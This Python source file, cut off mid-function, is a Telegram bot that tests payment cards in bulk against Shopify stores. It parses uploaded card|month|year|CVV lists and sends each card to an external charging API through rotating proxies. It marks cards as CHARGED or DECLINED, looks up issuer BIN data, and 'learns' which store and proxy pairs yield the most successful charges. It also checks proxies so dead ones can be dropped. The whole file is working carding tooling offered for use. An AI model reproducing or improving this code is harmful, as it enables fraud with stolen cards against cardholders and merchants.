# -*- coding: utf-8 -*-
"""
Bot de Telegram para verificar tarjetas - VERSIÓN ÉLITE ULTRA (SIN REINTENTOS)
Con formato profesional, UltraHealth para proxies, sin reintentos en verificaciones.
"""

import os
import json
import logging
import asyncio
import time
import random
import sqlite3
import re
from collections import deque, defaultdict
from typing import Dict, List, Tuple, Optional, Any
from datetime import datetime, timedelta
from contextlib import asynccontextmanager
import math
from dataclasses import dataclass, field
from enum import Enum
import statistics
import signal
import sys

from telegram import Update, Document, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, CallbackQueryHandler
import aiohttp

# ================== MANEJO DE SEÑALES PARA RAILWAY ==================
def handle_shutdown(signum, frame):
    """Maneja señales de terminación"""
    logger.info(f"🛑 Recibida señal {signum}, cerrando gracefulmente...")
    sys.exit(0)

# Registrar manejadores de señales
signal.signal(signal.SIGTERM, handle_shutdown)
signal.signal(signal.SIGINT, handle_shutdown)

# ================== CONFIGURACIÓN SEGURA ==================
TOKEN = os.environ.get("BOT_TOKEN")
if not TOKEN:
    raise ValueError("❌ ERROR: BOT_TOKEN no está configurado")

# API Endpoints
API_ENDPOINTS = [
    os.environ.get("API_URL", "https://auto-shopify-api-production.up.railway.app/index.php"),
]

DB_FILE = os.environ.get("DB_FILE", "bot_database.db")
MAX_WORKERS_PER_USER = int(os.environ.get("MAX_WORKERS", 8))
RATE_LIMIT_SECONDS = int(os.environ.get("RATE_LIMIT", 2))
DAILY_LIMIT_CHECKS = int(os.environ.get("DAILY_LIMIT", 1000))
MASS_LIMIT_PER_HOUR = int(os.environ.get("MASS_LIMIT", 5))
ADMIN_IDS = [int(id) for id in os.environ.get("ADMIN_IDS", "").split(",") if id]

# Logging profesional
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ID único para esta instancia
INSTANCE_ID = os.environ.get("RAILWAY_DEPLOYMENT_ID", str(time.time()))

# ================== FUNCIÓN PARA BARRA DE PROGRESO ==================
def create_progress_bar(current: int, total: int, width: int = 20) -> str:
    """Crea una barra de progreso visual"""
    if total == 0:
        return "[" + "░" * width + "]"
    filled = int((current / total) * width)
    bar = "█" * filled + "░" * (width - filled)
    return f"[{bar}]"

# ================== FUNCIÓN PARA FORMATO DE PRECIO ==================
def format_price(price_str: str) -> str:
    """Extrae y formatea el precio de la respuesta de manera robusta"""
    try:
        # Patrones comunes de precio en respuestas
        patterns = [
            r'\$?(\d+\.\d{2})',           # $14.95 o 14.95
            r'Price["\s:]+(\d+\.\d{2})',   # "Price":"14.95"
            r'amount["\s:]+(\d+\.\d{2})',  # "amount":14.95
            r'(\d+\.\d{2})\s*USD',         # 14.95 USD
            r'USD\s*(\d+\.\d{2})',         # USD 14.95
            r'total["\s:]+(\d+\.\d{2})',   # "total":14.95
            r'value["\s:]+(\d+\.\d{2})',   # "value":14.95
        ]
        
        for pattern in patterns:
            match = re.search(pattern, price_str, re.IGNORECASE)
            if match:
                return f"${match.group(1)}"
        
        # Si no encuentra patrón, buscar cualquier número con 2 decimales
        match = re.search(r'(\d+\.\d{2})', price_str)
        if match:
            return f"${match.group(1)}"
            
    except Exception as e:
        logger.debug(f"Error formateando precio: {e}")
    
    return "N/A"

# ================== FUNCIÓN PARA CONSULTAR BIN ==================
async def get_bin_info(bin_code: str) -> Dict:
    """Consulta información de BIN usando API externa con aiohttp"""
    try:
        # Usar API gratuita de BIN
        async with aiohttp.ClientSession() as session:
            async with session.get(f"https://lookup.binlist.net/{bin_code}", timeout=5) as resp:
                if resp.status == 200:
                    data = await resp.json()
                    return {
                        "bank": data.get("bank", {}).get("name", "Unknown"),
                        "brand": data.get("scheme", "Unknown").upper(),
                        "country": data.get("country", {}).get("alpha2", "UN"),
                        "type": data.get("type", "Unknown"),
                        "level": data.get("brand", "Unknown")
                    }
    except asyncio.TimeoutError:
        logger.debug(f"Timeout consultando BIN {bin_code}")
    except Exception as e:
        logger.debug(f"Error consultando BIN {bin_code}: {e}")
    
    return {
        "bank": "Unknown",
        "brand": "UNKNOWN",
        "country": "UN",
        "type": "Unknown",
        "level": "Unknown"
    }

# ================== ENUMS Y DATACLASSES ==================
class CheckStatus(Enum):
    CHARGED = "charged"
    DECLINED = "declined"
    TIMEOUT = "timeout"
    ERROR = "error"
    CAPTCHA = "captcha"
    INSUFFICIENT_FUNDS = "insufficient_funds"
    THREE_DS = "3ds"
    UNKNOWN = "unknown"

@dataclass
class CheckResult:
    """Resultado de una verificación"""
    card_bin: str
    card_last4: str
    site: str
    proxy: str
    status: CheckStatus
    response_time: float
    http_code: Optional[int]
    response_text: str
    api_used: str
    error: Optional[str] = None
    success: bool = False
    bin_info: Dict = field(default_factory=dict)
    price: str = "$0.00"

# ================== VALIDACIÓN DE TARJETAS ==================
class CardValidator:
    @staticmethod
    def luhn_check(card_number: str) -> bool:
        def digits_of(n):
            return [int(d) for d in str(n)]
        digits = digits_of(card_number)
        odd_digits = digits[-1::-2]
        even_digits = digits[-2::-2]
        checksum = sum(odd_digits)
        for d in even_digits:
            checksum += sum(digits_of(d * 2))
        return checksum % 10 == 0

    @staticmethod
    def validate_expiry(month: str, year: str) -> bool:
        try:
            exp_month = int(month)
            exp_year = int(year)
            if len(year) == 2:
                exp_year += 2000
            
            now = datetime.now()
            current_year = now.year
            current_month = now.month
            
            if exp_year < current_year:
                return False
            if exp_year == current_year and exp_month < current_month:
                return False
            return True
        except:
            return False

    @staticmethod
    def validate_cvv(cvv: str) -> bool:
        return cvv.isdigit() and len(cvv) in (3, 4)

    @staticmethod
    def parse_card(card_str: str) -> Optional[Dict]:
        parts = card_str.split('|')
        if len(parts) != 4:
            return None
        
        number, month, year, cvv = parts
        
        if not number.isdigit() or len(number) < 13 or len(number) > 19:
            return None
        if not CardValidator.luhn_check(number):
            return None
        if not CardValidator.validate_expiry(month, year):
            return None
        if not CardValidator.validate_cvv(cvv):
            return None
            
        return {
            "number": number,
            "month": month,
            "year": year,
            "cvv": cvv,
            "bin": number[:6],
            "last4": number[-4:]
        }

# ================== DETECCIÓN DE ARCHIVOS ==================
def detect_line_type(line: str) -> Tuple[str, Optional[str]]:
    line = line.strip()
    if not line:
        return None, None

    if line.startswith(('http://', 'https://')):
        return 'site', line

    if '|' in line:
        parts = line.split('|')
        if len(parts) == 4:
            return 'card', line

    if ':' in line:
        parts = line.split(':')
        if len(parts) in [2, 4] or (len(parts) == 3 and parts[2] == ''):
            return 'proxy', line

    return None, None

# ================== BASE DE DATOS ==================
class Database:
    def __init__(self, db_path=DB_FILE):
        self.db_path = db_path
        self._write_lock = asyncio.Lock()
        self._batch_queue = []
        self._batch_lock = asyncio.Lock()
        self._batch_task = None
        self._initialized = False
        
    def _init_db_sync(self):
        with sqlite3.connect(self.db_path) as conn:
            conn.execute("PRAGMA journal_mode=WAL")
            
            cursor = conn.cursor()
            
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS users (
                    user_id INTEGER PRIMARY KEY,
                    sites TEXT DEFAULT '[]',
                    proxies TEXT DEFAULT '[]',
                    cards TEXT DEFAULT '[]',
                    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                )
            ''')
            
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS learning (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    user_id INTEGER,
                    site TEXT,
                    proxy TEXT,
                    attempts INTEGER DEFAULT 0,
                    successes INTEGER DEFAULT 0,
                    timeouts INTEGER DEFAULT 0,
                    declines INTEGER DEFAULT 0,
                    charged INTEGER DEFAULT 0,
                    total_time REAL DEFAULT 0,
                    last_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    UNIQUE(user_id, site, proxy)
                )
            ''')
            
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS results (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    user_id INTEGER,
                    card_bin TEXT,
                    card_last4 TEXT,
                    site TEXT,
                    proxy TEXT,
                    status TEXT,
                    response_time REAL,
                    http_code INTEGER,
                    price TEXT,
                    bin_info TEXT,
                    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                )
            ''')
            
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS rate_limits (
                    user_id INTEGER PRIMARY KEY,
                    last_command TIMESTAMP,
                    checks_today INTEGER DEFAULT 0,
                    last_reset DATE DEFAULT CURRENT_DATE
                )
            ''')
            
            conn.commit()

    async def initialize(self):
        if self._initialized:
            return
        
        loop = asyncio.get_event_loop()
        await loop.run_in_executor(None, self._init_db_sync)
        self._initialized = True
        logger.info("✅ Base de datos inicializada")

    async def execute(self, query: str, params: tuple = ()):
        async with self._write_lock:
            loop = asyncio.get_event_loop()
            return await loop.run_in_executor(
                None, lambda: self._sync_execute(query, params)
            )

    def _sync_execute(self, query: str, params: tuple):
        with sqlite3.connect(self.db_path) as conn:
            cursor = conn.cursor()
            cursor.execute(query, params)
            conn.commit()
            return cursor

    async def fetch_one(self, query: str, params: tuple = ()):
        loop = asyncio.get_event_loop()
        return await loop.run_in_executor(
            None, lambda: self._sync_fetch_one(query, params)
        )

    def _sync_fetch_one(self, query: str, params: tuple):
        with sqlite3.connect(self.db_path) as conn:
            conn.row_factory = sqlite3.Row
            cursor = conn.cursor()
            cursor.execute(query, params)
            row = cursor.fetchone()
            return dict(row) if row else None

    async def fetch_all(self, query: str, params: tuple = ()):
        loop = asyncio.get_event_loop()
        return await loop.run_in_executor(
            None, lambda: self._sync_fetch_all(query, params)
        )

    def _sync_fetch_all(self, query: str, params: tuple):
        with sqlite3.connect(self.db_path) as conn:
            conn.row_factory = sqlite3.Row
            cursor = conn.cursor()
            cursor.execute(query, params)
            return [dict(row) for row in cursor.fetchall()]

    async def save_result(self, user_id: int, result: CheckResult):
        await self.execute(
            """INSERT INTO results 
               (user_id, card_bin, card_last4, site, proxy, status, 
                response_time, http_code, price, bin_info)
               VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)""",
            (user_id, result.card_bin, result.card_last4, 
             result.site, result.proxy, result.status.value,
             result.response_time, result.http_code, result.price,
             json.dumps(result.bin_info))
        )

    async def shutdown(self):
        pass

# ================== PROXY HEALTH CHECKER ==================
class ProxyHealthChecker:
    def __init__(self, db: Database, user_id: int):
        self.db = db
        self.user_id = user_id
        self.test_url = "https://httpbin.org/ip"
        self.timeout = 8
        
    async def check_proxy(self, proxy: str) -> Dict:
        start_time = time.time()
        result = {
            "proxy": proxy,
            "alive": False,
            "response_time": 0,
            "error": None,
            "ip": None
        }
        
        try:
            proxy_parts = proxy.split(':')
            if len(proxy_parts) == 4:
                proxy_url = f"http://{proxy_parts[2]}:{proxy_parts[3]}@{proxy_parts[0]}:{proxy_parts[1]}"
            else:
                proxy_url = f"http://{proxy_parts[0]}:{proxy_parts[1]}"
            
            timeout = aiohttp.ClientTimeout(total=self.timeout, connect=5)
            
            async with aiohttp.ClientSession(timeout=timeout) as session:
                async with session.get(self.test_url, proxy=proxy_url) as resp:
                    if resp.status == 200:
                        elapsed = time.time() - start_time
                        result["alive"] = True
                        result["response_time"] = elapsed
                        try:
                            data = await resp.json()
                            result["ip"] = data.get("origin", "Unknown")
                        except:
                            pass
                    else:
                        result["error"] = f"HTTP {resp.status}"
        except Exception as e:
            result["error"] = str(e)[:50]
        
        return result
    
    async def check_all_proxies(self, proxies: List[str], max_concurrent: int = 25) -> List[Dict]:
        semaphore = asyncio.Semaphore(max_concurrent)
        
        async def check_with_semaphore(proxy):
            async with semaphore:
                return await self.check_proxy(proxy)
        
        tasks = [check_with_semaphore(p) for p in proxies]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        final_results = []
        for i, res in enumerate(results):
            if isinstance(res, Exception):
                final_results.append({
                    "proxy": proxies[i],
                    "alive": False,
                    "response_time": 0,
                    "error": str(res),
                    "ip": None
                })
            else:
                final_results.append(res)
        
        return final_results

# ================== SISTEMA DE APRENDIZAJE ==================
class LearningSystem:
    def __init__(self, db: Database, user_id: int):
        self.db = db
        self.user_id = user_id
        self.EPSILON = 0.1

    async def update(self, result: CheckResult):
        site = result.site
        proxy = result.proxy
        elapsed = result.response_time
        
        existing = await self.db.fetch_one(
            "SELECT * FROM learning WHERE user_id = ? AND site = ? AND proxy = ?",
            (self.user_id, site, proxy)
        )
        
        if existing:
            attempts = existing["attempts"] + 1
            successes = existing["successes"] + (1 if result.success else 0)
            timeouts = existing["timeouts"] + (1 if result.status == CheckStatus.TIMEOUT else 0)
            declines = existing["declines"] + (1 if result.status == CheckStatus.DECLINED else 0)
            charged = existing["charged"] + (1 if result.status == CheckStatus.CHARGED else 0)
            total_time = existing["total_time"] + elapsed
            
            await self.db.execute(
                """UPDATE learning SET 
                   attempts = ?, successes = ?, timeouts = ?, declines = ?,
                   charged = ?, total_time = ?, last_seen = CURRENT_TIMESTAMP
                   WHERE id = ?""",
                (attempts, successes, timeouts, declines, charged, total_time, existing["id"])
            )
        else:
            await self.db.execute(
                """INSERT INTO learning 
                   (user_id, site, proxy, attempts, successes, timeouts, declines, charged, total_time)
                   VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)""",
                (self.user_id, site, proxy, 1, 1 if result.success else 0,
                 1 if result.status == CheckStatus.TIMEOUT else 0,
                 1 if result.status == CheckStatus.DECLINED else 0,
                 1 if result.status == CheckStatus.CHARGED else 0, elapsed)
            )

    async def get_score(self, site: str, proxy: str) -> float:
        row = await self.db.fetch_one(
            "SELECT * FROM learning WHERE user_id = ? AND site = ? AND proxy = ?",
            (self.user_id, site, proxy)
        )
        
        if not row or row["attempts"] < 3:
            return 0.5
        
        attempts = row["attempts"]
        charged = row["charged"]
        avg_time = row["total_time"] / attempts if attempts > 0 else 1.0
        
        success_rate = charged / attempts
        speed_score = 1.0 / (avg_time + 0.5)
        
        return success_rate * 1.5 + speed_score * 0.5

    async def choose_combination(self, sites: List[str], proxies: List[str]) -> Tuple[str, str]:
        if random.random() < self.EPSILON:
            return random.choice(sites), random.choice(proxies)
        
        scores = []
        for site in sites:
            for proxy in proxies:
                score = await self.get_score(site, proxy)
                scores.append((score, site, proxy))
        
        scores.sort(reverse=True)
        return scores[0][1], scores[0][2]

# ================== CHECKER ULTRA RÁPIDO (SIN REINTENTOS) ==================
class UltraFastChecker:
    def __init__(self):
        self.connector = None
        self.session_pool = deque(maxlen=30)
        self._initialized = False
        
    async def initialize(self):
        if self._initialized:
            return
        self.connector = aiohttp.TCPConnector(limit=200, ttl_dns_cache=300)
        await self._create_sessions()
        self._initialized = True

    async def _create_sessions(self):
        for _ in range(30):
            session = aiohttp.ClientSession(
                connector=self.connector,
                timeout=aiohttp.ClientTimeout(total=12)
            )
            self.session_pool.append(session)

    async def get_session(self):
        if not self._initialized:
            await self.initialize()
        if not self.session_pool:
            return aiohttp.ClientSession(connector=self.connector)
        return self.session_pool.popleft()

    async def return_session(self, session):
        if not session.closed:
            self.session_pool.append(session)

    async def shutdown(self):
        self._initialized = False
        while self.session_pool:
            s = self.session_pool.popleft()
            try:
                await s.close()
            except:
                pass
        if self.connector:
            await self.connector.close()

    async def check_card(self, site: str, proxy: str, card_data: Dict) -> CheckResult:
        card_str = f"{card_data['number']}|{card_data['month']}|{card_data['year']}|{card_data['cvv']}"
        params = {"site": site, "cc": card_str, "proxy": proxy}
        
        session = await self.get_session()
        start_time = time.time()
        
        # Obtener información del BIN
        bin_info = await get_bin_info(card_data['bin'])
        
        try:
            # SOLO UN INTENTO - SIN REINTENTOS
            async with session.get(API_ENDPOINTS[0], params=params, timeout=10) as resp:
                elapsed = time.time() - start_time
                response_text = await resp.text()
                
                # Determinar estado
                status = CheckStatus.UNKNOWN
                success = False
                
                if resp.status == 200:
                    if "Thank You" in response_text or "CHARGED" in response_text:
                        status = CheckStatus.CHARGED
                        success = True
                    elif "3DS" in response_text or "3D_AUTHENTICATION" in response_text:
                        status = CheckStatus.THREE_DS
                    elif "CAPTCHA" in response_text:
                        status = CheckStatus.CAPTCHA
                    elif "INSUFFICIENT_FUNDS" in response_text:
                        status = CheckStatus.INSUFFICIENT_FUNDS
                    elif "DECLINE" in response_text:
                        status = CheckStatus.DECLINED
                elif resp.status >= 500:
                    status = CheckStatus.ERROR
                elif resp.status >= 400:
                    status = CheckStatus.DECLINED
                
                # Extraer precio
                price = format_price(response_text)
                
                return CheckResult(
                    card_bin=card_data['bin'],
                    card_last4=card_data['last4'],
                    site=site,
                    proxy=proxy,
                    status=status,
                    response_time=elapsed,
                    http_code=resp.status,
                    response_text=response_text,
                    api_used=API_ENDPOINTS[0],
                    success=success,
                    bin_info=bin_info,
                    price=price
                )
                
        except asyncio.TimeoutError:
            elapsed = time.time() - start_time
            return CheckResult(
                card_bin=card_data['bin'],
                card_last4=card_data['last4'],
                site=site,
                proxy=proxy,
                status=CheckStatus.TIMEOUT,
                response_time=elapsed,
                http_code=None,
                response_text="",
                api_used=API_ENDPOINTS[0],
                success=False,
                bin_info=bin_info,
                price="$0.00",
                error="Timeout"
            )
        except aiohttp.ClientError as e:
            elapsed = time.time() - start_time
            return CheckResult(
                card_bin=card_data['bin'],
                card_last4=card_data['last4'],
                site=site,
                proxy=proxy,
                status=CheckStatus.ERROR,
                response_time=elapsed,
                http_code=None,
                response_text="",
                api_used=API_ENDPOINTS[0],
                success=False,
                bin_info=bin_info,
                price="$0.00",
                error=str(e)
            )
        except Exception as e:
            elapsed = time.time() - start_time
            logger.error(f"Error inesperado: {e}", exc_info=True)
            return CheckResult(
                card_bin=card_data['bin'],
                card_last4=card_data['last4'],
                site=site,
                proxy=proxy,
                status=CheckStatus.ERROR,
                response_time=elapsed,
                http_code=None,
                response_text="",
                api_used=API_ENDPOINTS[0],
                success=False,
                bin_info=bin_info,
                price="$0.00",
                error=str(e)
            )
        finally:
            await self.return_session(session)

# ================== USER MANAGER ==================
class UserManager:
    def __init__(self, db: Database):
        self.db = db

    async def get_user_data(self, user_id: int) -> Dict:
        row = await self.db.fetch_one(
            "SELECT sites, proxies, cards FROM users WHERE user_id = ?",
            (user_id,)
        )
        
        if not row:
            await self.db.execute(
                "INSERT INTO users (user_id, sites, proxies, cards) VALUES (?, ?, ?, ?)",
                (user_id, '[]', '[]', '[]')
            )
            return {"sites": [], "proxies": [], "cards": []}
        
        return {
            "sites": json.loads(row["sites"]),
            "proxies": json.loads(row["proxies"]),
            "cards": json.loads(row["cards"])
        }

    async def update_user_data(self, user_id: int, sites=None, proxies=None, cards=None):
        current = await self.get_user_data(user_id)
        
        if sites is not None:
            current["sites"] = sites
        if proxies is not None:
            current["proxies"] = proxies
        if cards is not None:
            current["cards"] = cards
        
        await self.db.execute(
            """UPDATE users SET 
               sites = ?, proxies = ?, cards = ? 
               WHERE user_id = ?""",
            (json.dumps(current["sites"]), 
             json.dumps(current["proxies"]), 
             json.dumps(current["cards"]), 
             user_id)
        )

    async def check_rate_limit(self, user_id: int) -> Tuple[bool, str]:
        today = datetime.now().date()
        
        row = await self.db.fetch_one(
            "SELECT * FROM rate_limits WHERE user_id = ?",
            (user_id,)
        )
        
        if not row:
            await self.db.execute(
                "INSERT INTO rate_limits (user_id, last_command, checks_today, last_reset) VALUES (?, ?, ?, ?)",
                (user_id, datetime.now(), 0, today)
            )
            return True, ""
        
        last_reset = datetime.fromisoformat(row["last_reset"]).date()
        if last_reset < today:
            await self.db.execute(
                "UPDATE rate_limits SET checks_today = 0, last_reset = ? WHERE user_id = ?",
                (today, user_id)
            )
            checks_today = 0
        else:
            checks_today = row["checks_today"]
        
        if checks_today >= DAILY_LIMIT_CHECKS:
            return False, f"Límite diario alcanzado ({DAILY_LIMIT_CHECKS})"
        
        last_command = datetime.fromisoformat(row["last_command"])
        seconds_since = (datetime.now() - last_command).seconds
        if seconds_since < RATE_LIMIT_SECONDS:
            return False, f"Espera {RATE_LIMIT_SECONDS - seconds_since}s"
        
        return True, ""

    async def increment_checks(self, user_id: int):
        await self.db.execute(
            "UPDATE rate_limits SET checks_today = checks_today + 1, last_command = ? WHERE user_id = ?",
            (datetime.now(), user_id)
        )

# ================== CARD CHECK SERVICE ==================
class CardCheckService:
    def __init__(self, db: Database, user_manager: UserManager, checker: UltraFastChecker):
        self.db = db
        self.user_manager = user_manager
        self.checker = checker

    async def check_single(self, user_id: int, card_data: Dict, site: str, proxy: str) -> CheckResult:
        result = await self.checker.check_card(site, proxy, card_data)
        await self.db.save_result(user_id, result)
        
        learning = LearningSystem(self.db, user_id)
        await learning.update(result)
        
        return result

    async def check_mass(
        self, 
        user_id: int,
        cards: List[Dict],
        sites: List[str],
        proxies: List[str],
        num_workers: int,
        progress_callback=None
    ) -> Tuple[List[CheckResult], int, float]:
        
        queue = asyncio.Queue()
        for card in cards:
            await queue.put(card)
        
        results = []
        processed = 0
        success_count = 0
        start_time = time.time()
        learning = LearningSystem(self.db, user_id)
        
        async def worker(worker_id: int):
            nonlocal processed, success_count
            worker_processed = 0
            worker_success = 0
            
            while not queue.empty() and not cancel_mass.get(user_id, False):
                try:
                    card_data = await asyncio.wait_for(queue.get(), timeout=1.0)
                except asyncio.TimeoutError:
                    break
                
                site, proxy = await learning.choose_combination(sites, proxies)
                result = await self.checker.check_card(site, proxy, card_data)
                
                worker_processed += 1
                if result.success:
                    worker_success += 1
                
                results.append(result)
                await learning.update(result)
                await self.db.save_result(user_id, result)
                
                processed += 1
                if result.success:
                    success_count += 1
                
                if progress_callback and worker_processed % 5 == 0:
                    await progress_callback(processed, success_count, len(cards))
        
        tasks = [asyncio.create_task(worker(i)) for i in range(num_workers)]
        await asyncio.gather(*tasks, return_exceptions=True)
        
        elapsed = time.time() - start_time
        return results, success_count, elapsed

# ================== VARIABLES GLOBALES ==================
db = None
user_manager = None
checker = None
card_service = None
cancel_mass = {}

# ================== HANDLERS ==================

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    texto = (
        "❖ *SHOPIFY CHECKER BOT* ❖\n"
        "━━━━━━━━━━━━━━━━━━━━━\n\n"
        "*GATES*  \n"
        "• `/sh [card]` · SHOPIFY CUSTOM GATE\n"
        "• `/msh [workers]` · MASS SHOPIFY\n"
        "• `/proxyhealth` · PROXY CHECKER\n\n"
        "*SITES*  \n"
        "• `/addsite [url]` · ADD SHOPIFY STORE\n"
        "• `/listsites` · LIST SITES\n"
        "• `/removesite [n]` · REMOVE SITE\n\n"
        "*PROXIES*  \n"
        "• `/addproxy [ip:port]` · ADD PROXY\n"
        "• `/listproxies` · LIST PROXIES\n"
        "• `/removeproxy [n]` · REMOVE PROXY\n"
        "• `/cleanproxies` · REMOVE DEAD PROXIES\n\n"
        "*CARDS*  \n"
        "• `/addcards` · ADD CARDS (via .txt)\n"
        "• `/listcards` · LIST CARDS\n"
        "• `/removecard [n]` · REMOVE CARD\n\n"
        "*STATS*  \n"
        "• `/stats` · BOT STATISTICS\n"
        "• `/stop` · STOP CURRENT PROCESS\n\n"
        "❖ *PROTECTION ACTIVE* ❖"
    )
    await update.message.reply_text(texto, parse_mode="Markdown")

# ===== COMANDOS DE SITIOS =====
async def addsite(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        await update.message.reply_text(
            "❖ *USAGE*: `/addsite [url]`\n"
            "EXAMPLE: `/addsite mystore.myshopify.com`\n\n"
            "YOU CAN ADD MULTIPLE SITES; THEY ROTATE ON `/sh` AND `/msh`.",
            parse_mode="Markdown"
        )
        return
    
    url = context.args[0].strip()
    if not url.startswith(('http://', 'https://')):
        url = 'https://' + url
    
    user_id = update.effective_user.id
    user_data = await user_manager.get_user_data(user_id)
    user_data["sites"].append(url)
    await user_manager.update_user_data(user_id, sites=user_data["sites"])
    
    await update.message.reply_text(
        f"❖ *STORE VERIFIED & SAVED* ❖\n"
        f"━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"▶ *SITE*: `{url}`\n"
        f"▶ *TOTAL SITES*: `{len(user_data['sites'])}`\n\n"
        f"THEY AUTO-ROTATE ON `/sh` AND `/msh`.",
        parse_mode="Markdown"
    )

async def listsites(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user_data = await user_manager.get_user_data(user_id)
    sites = user_data["sites"]
    
    if not sites:
        await update.message.reply_text(
            "📭 *NO SITES FOUND*\n"
            "━━━━━━━━━━━━━━━━━━━━━\n\n"
            "Use `/addsite` to add a Shopify store.",
            parse_mode="Markdown"
        )
        return
    
    lines = ["❖ *YOUR SITES* ❖", "━━━━━━━━━━━━━━━━━━━━━", ""]
    for i, site in enumerate(sites, 1):
        lines.append(f"`{i}.` {site}")
    
    await update.message.reply_text("\n".join(lines), parse_mode="Markdown")

async def removesite(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        await update.message.reply_text(
            "❖ *USAGE*: `/removesite [number]`\n"
            "EXAMPLE: `/removesite 2`\n\n"
            "Use `/listsites` to see site numbers.",
            parse_mode="Markdown"
        )
        return
    
    try:
        index = int(context.args[0]) - 1
    except:
        await update.message.reply_text("❌ Invalid number.")
        return
    
    user_id = update.effective_user.id
    user_data = await user_manager.get_user_data(user_id)
    sites = user_data["sites"]
    
    if index < 0 or index >= len(sites):
        await update.message.reply_text(f"❌ Invalid index. You have {len(sites)} sites.")
        return
    
    removed = sites.pop(index)
    await user_manager.update_user_data(user_id, sites=sites)
    
    await update.message.reply_text(
        f"🗑️ *SITE REMOVED*\n"
        f"━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"Removed: `{removed}`\n"
        f"Remaining: `{len(sites)}` sites",
        parse_mode="Markdown"
    )

# ===== COMANDOS DE PROXIES =====
async def addproxy(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        await update.message.reply_text(
            "❖ *USAGE*: `/addproxy [ip:port]` or `/addproxy [ip:port:user:pass]`\n"
            "EXAMPLE: `/addproxy p.webshare.io:80:user:pass`\n\n"
            "ACCEPTED: `ip:port` OR `ip:port:username:password`",
            parse_mode="Markdown"
        )
        return
    
    proxy_input = context.args[0].strip()
    colon_count = proxy_input.count(':')
    
    if colon_count == 1:
        proxy = f"{proxy_input}::"
    elif colon_count == 3:
        proxy = proxy_input
    else:
        await update.message.reply_text("❌ Invalid proxy format.")
        return
    
    user_id = update.effective_user.id
    user_data = await user_manager.get_user_data(user_id)
    user_data["proxies"].append(proxy)
    await user_manager.update_user_data(user_id, proxies=user_data["proxies"])
    
    display_proxy = proxy.split(':')[0] + ':' + proxy.split(':')[1]
    
    await update.message.reply_text(
        f"❖ *PROXY SET* ❖\n"
        f"━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"`{display_proxy}`\n\n"
        f"Total proxies: `{len(user_data['proxies'])}`",
        parse_mode="Markdown"
    )

async def listproxies(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user_data = await user_manager.get_user_data(user_id)
    proxies = user_data["proxies"]
    
    if not proxies:
        await update.message.reply_text(
            "📭 *NO PROXIES FOUND*\n"
            "━━━━━━━━━━━━━━━━━━━━━\n\n"
            "Use `/addproxy` to add proxies.",
            parse_mode="Markdown"
        )
        return
    
    lines = ["❖ *YOUR PROXIES* ❖", "━━━━━━━━━━━━━━━━━━━━━", ""]
    for i, p in enumerate(proxies, 1):
        display = p.split(':')[0] + ':' + p.split(':')[1]
        lines.append(f"`{i}.` {display}")
    
    await update.message.reply_text("\n".join(lines), parse_mode="Markdown")

async def removeproxy(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        await update.message.reply_text(
            "❖ *USAGE*: `/removeproxy [number]`\n"
            "EXAMPLE: `/removeproxy 2`\n\n"
            "Use `/listproxies` to see proxy numbers.",
            parse_mode="Markdown"
        )
        return
    
    try:
        index = int(context.args[0]) - 1
    except:
        await update.message.reply_text("❌ Invalid number.")
        return
    
    user_id = update.effective_user.id
    user_data = await user_manager.get_user_data(user_id)
    proxies = user_data["proxies"]
    
    if index < 0 or index >= len(proxies):
        await update.message.reply_text(f"❌ Invalid index. You have {len(proxies)} proxies.")
        return
    
    removed = proxies.pop(index)
    await user_manager.update_user_data(user_id, proxies=proxies)
    
    display = removed.split(':')[0] + ':' + removed.split(':')[1]
    
    await update.message.reply_text(
        f"🗑️ *PROXY REMOVED*\n"
        f"━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"Removed: `{display}`\n"
        f"Remaining: `{len(proxies)}` proxies",
        parse_mode="Markdown"
    )

async def proxyhealth_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user_data = await user_manager.get_user_data(user_id)
    proxies = user_data["proxies"]
    
    if not proxies:
        await update.message.reply_text(
            "📭 *NO PROXIES FOUND*\n"
            "━━━━━━━━━━━━━━━━━━━━━\n\n"
            "Use `/addproxy` to add proxies first.",
            parse_mode="Markdown"
        )
        return
    
    msg = await update.message.reply_text(
        f"❖ *CHECKING PROXIES* ❖\n"
        f"━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"Total: `{len(proxies)}` proxies\n"
        f"Status: 🔄 Testing...",
        parse_mode="Markdown"
    )
    
    health_checker = ProxyHealthChecker(db, user_id)
    results = await health_checker.check_all_proxies(proxies)
    
    alive = [r for r in results if r["alive"]]
    dead = [r for r in results if not r["alive"]]
    
    keyboard = []
    if dead:
        keyboard.append([InlineKeyboardButton("🗑️ REMOVE DEAD PROXIES", callback_data=f"clean_{user_id}")])
    
    reply_markup = InlineKeyboardMarkup(keyboard) if keyboard else None
    
    lines = [
        f"❖ *PROXY HEALTH CHECK* ❖",
        f"━━━━━━━━━━━━━━━━━━━━━",
        f"",
        f"📊 *RESULTS*:",
        f"• ✅ ALIVE: `{len(alive)}`",
        f"• ❌ DEAD: `{len(dead)}`",
        f""
    ]
    
    if alive:
